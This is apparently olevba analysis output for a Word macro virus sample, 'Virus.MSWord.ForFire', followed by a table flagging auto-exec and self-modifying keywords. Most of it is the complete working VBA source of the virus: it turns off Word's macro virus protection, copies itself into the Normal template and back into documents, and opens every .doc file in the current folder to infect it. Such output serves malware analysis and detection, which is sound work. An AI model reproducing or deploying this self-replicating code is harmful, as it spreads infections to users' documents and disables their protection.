olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ForFire
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ForFire - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next
With Options
.VirusProtection = 0
.SaveNormalPrompt = 0
End With
Set a = NormalTemplate
Set c = a.VBProject.VBComponents(1)
Set B = c.CodeModule
Set t = ActiveDocument
Set i = t.VBProject.VBComponents(1)
Set Z = i.CodeModule
If B.Lines(2, 1) <> "On Error Resume Next" Then
B.DeleteLines 1, B.CountOfLines
B.InsertLines 1, Z.Lines(1, Z.CountOfLines)
B.ReplaceLine 1, "Sub Document_Close()"
B.ReplaceLine 30, "Sub AutoExit()"
B.ReplaceLine 43, "Call Document_Close()"
End If
If Z.Lines(2, 1) <> "On Error Resume Next" Then
Z.DeleteLines 1, Z.CountOfLines
Z.InsertLines 1, B.Lines(1, B.CountOfLines)
Z.ReplaceLine 1, "Sub Document_Open()"
Z.ReplaceLine 30, "Sub " & "A" & Day(Now) & "()"
Z.ReplaceLine 43, "Call Document_Open()"
t.SaveAs FileName:=t.FullName, FileFormat:=wdFormatDocument
End If
End Sub

Sub A11()
    On Error Resume Next
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Document_Open
    End If
Loop
'No junk food, just earthly goods
'I ate weird berries in the woods
'Now I 'm seeing colors, I'm getting higher
'I think I'll start a forest fire
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

